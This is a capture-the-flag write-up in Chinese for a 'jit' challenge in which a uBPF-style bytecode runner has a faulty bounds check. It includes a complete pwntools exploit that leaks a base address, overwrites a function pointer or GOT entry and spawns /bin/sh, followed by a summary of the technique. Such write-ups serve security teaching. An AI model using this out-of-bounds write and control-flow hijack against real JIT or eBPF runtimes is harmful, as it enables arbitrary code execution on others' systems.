# jit

## 题目简述

题目实现了一个 JIT/字节码转换执行环境，用户提交类似 eBPF 的程序和一段内存内容。转换流程中的越界访问校验不正确，导致构造出的程序可以越界读写宿主进程地址，进而改写函数指针或 GOT 项实现命令执行。

## 解题过程

程序转换流程存在越界访问校验错误，可利用该越界漏洞实现任意地址读写。
动态 flag 需要写入 `/home/ctf/flag` 文件。

```python
import ubpf.assembler
from pwn import *
context.log_level = "debug"
#sh = process(['jit'])
sh = remote('127.0.0.1', 9999)

program = '''
ldxdw %r0, [%r1+0x58]
sub %r0, 0x61bd0
mov %r2, %r0
add %r2, 0x52290
mov %r3, %r0
add %r3, 0x1eee48
stxdw [%r3], %r2
exit
'''

program = ubpf.assembler.assemble(program).encode('hex')

sh.sendlineafter("Program: ", program)

# gdb.attach(sh, '''
# b *$rebase(0x2947)
# c
# si
# ''')
sh.sendlineafter("Memory: ", "/bin/sh".encode('hex'))



sh.interactive()

```

利用脚本用 `ubpf.assembler` 组装 eBPF 指令。核心指令先从上下文对象偏移 `0x58` 泄露基址，再通过固定偏移计算目标地址，把指向命令执行路径的地址写入可劫持位置。随后把 `/bin/sh` 作为 Memory 输入传入，触发被改写后的执行流程进入 shell。

## 方法总结

- 核心技巧：利用 JIT 校验与实际内存访问语义不一致造成的越界读写。
- 识别信号：题目让用户提交字节码/JIT 程序，并声称做了内存边界检查时，应对比“校验器接受的访问”和“运行时真正生成的访问”。
- 复用要点：保留泄露基址、计算目标偏移和写入劫持点的逻辑，比单独保存 exploit 更有价值。
